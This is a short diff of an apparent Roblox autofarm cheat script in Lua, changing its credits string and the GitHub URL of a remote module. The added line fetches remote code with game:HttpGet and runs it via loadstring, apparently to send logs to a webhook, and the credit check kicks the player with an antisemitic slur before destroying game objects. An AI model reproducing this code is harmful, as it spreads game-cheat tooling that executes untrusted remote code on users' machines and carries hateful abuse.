@@ -707,7 +707,7 @@ local Players = game:GetService("Players")
 local Cashiers = workspace.Cashiers
 local Player = Players.LocalPlayer
 
-if (_G.AutofarmSettings.Credits ~= "iku autofarm - by @trans") then 
+if (_G.AutofarmSettings.Credits ~= "Nx Crazy Dev") then 
 	Player:Kick("dont edit the credits in the config you stupid jew")
 	task.wait(10)
 	Cashiers:Destroy()
@@ -841,7 +841,7 @@ local GetCloseCash = function()
 	return Am
 end
 
-local SendLog = loadstring(game:HttpGet("https://github.com/applless/RandomScripts/raw/main/Webhookk"))()
+local SendLog = loadstring(game:HttpGet("https://raw.githubusercontent.com/script-by/Nx-Crazy-Dev/main/Webhookk"))()
 
 local Attack = function()
 	local Mode = tonumber(_G.AutofarmSettings.AttackMode)
